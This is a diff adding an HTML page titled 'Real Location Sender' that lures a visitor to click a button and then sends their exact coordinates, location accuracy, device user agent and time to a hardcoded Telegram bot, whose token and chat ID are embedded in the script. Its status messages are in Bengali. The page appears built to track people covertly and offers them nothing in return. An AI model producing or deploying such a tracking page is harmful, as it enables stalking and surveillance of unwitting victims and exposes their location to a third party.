@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Real Location Sender</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 50px;
+      background: #f0f0f0;
+    }
+    button {
+      padding: 15px 30px;
+      font-size: 18px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    p {
+      margin-top: 20px;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+  <h2>click the botton for your next target By 乙x 𝙷¹⁰</h2>
+  <button onclick="sendLocation()"> click the botton </button>
+  <p id="status"></p>
+
+  <script>
+    const botToken = '8092959406:AAFe5nkwzUQuwy5uFXicCTQ1alykh4wpagg';
+    const chatId = '8092556476';
+
+    function sendLocation() {
+      const status = document.getElementById("status");
+
+      if (navigator.geolocation) {
+        status.innerText = "📡 লোকেশন নেওয়া হচ্ছে, অনুগ্রহ করে অপেক্ষা করুন...";
+        navigator.geolocation.getCurrentPosition(async function(position) {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+          const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+          const device = navigator.userAgent;
+          const time = new Date().toLocaleString();
+
+          const message = `
+🛰️ Real Location Tracked
+
+📍 Latitude: ${lat}
+📍 Longitude: ${lon}
+🎯 Accuracy: ±${accuracy} meters
+🔗 Map: ${mapLink}
+🕒 Time: ${time}
+📱 Device: ${device}
+          `;
+
+          // Send message
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: message
+            })
+          });
+
+          // Send map pin
+          await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              latitude: lat,
+              longitude: lon
+            })
+          });
+
+          status.innerText = "✅ লোকেশন সফলভাবে টেলিগ্রামে পাঠানো হয়েছে!";
+        }, function(error) {
+          status.innerText = "❌ লোকেশন নেওয়া যায়নি: " + error.message;
+        });
+      } else {
+        status.innerText = "❌ আপনার ব্রাউজারে Geolocation সাপোর্ট করে না।";
+      }
+    }
+  </script>
+</body>
+</html>
